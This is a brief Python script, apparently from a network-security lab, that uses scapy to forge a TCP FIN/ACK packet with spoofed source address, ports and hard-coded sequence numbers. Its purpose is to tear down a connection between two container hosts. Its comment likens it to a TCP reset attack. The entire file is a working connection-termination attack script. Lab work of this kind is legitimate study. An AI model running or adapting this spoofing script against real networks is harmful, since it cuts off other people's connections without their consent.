#!/usr/bin/python3
import sys
from scapy.all import *


# UNTOUCHED COZ ITS SAME AS RESET PRE MUCH

print("SENDING FIN PACKET.........")
IPLayer = IP(src="172.17.0.4", dst="172.17.0.3")
TCPLayer = TCP(sport=1234, dport=48528,flags="FA", seq=409783893, ack=2975205984)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)

